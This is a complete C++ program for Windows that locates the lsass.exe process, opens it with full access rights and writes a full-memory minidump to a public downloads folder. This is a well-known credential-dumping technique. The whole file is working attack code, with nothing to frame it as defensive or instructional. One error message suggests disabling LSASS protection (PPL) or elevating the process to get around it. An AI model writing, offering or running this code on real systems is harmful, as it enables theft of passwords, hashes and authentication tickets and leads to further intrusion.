#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <iostream>

#pragma comment(lib, "dbghelp.lib")

int main() {
    // find lsass
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    if (pid == 0) {
        std::cerr << "Unable to find lsass.exe proc\n";
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProc == INVALID_HANDLE_VALUE || hProc == 0) {
        std::cerr << "Cannot open lsass.exe: " << GetLastError() << "\n";
        std::cerr << "Maybe run as admin and disable PPL for lsass / elevate this proc to PPL\n";
        return 1;
    }

    char outFile[] = "C:\\Users\\Public\\Downloads\\test.dmp";
    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateFile failed: " << GetLastError() << "\n";
        return 1;
    }

    BOOL ok = MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (ok) {
        std::cout << "MiniDumpWriteDump ok\n";
    }
    else {
        std::cout << "MiniDumpWriteDump error: " << GetLastError() << "\n";
    }

    CloseHandle(hFile);
    return 0;
}
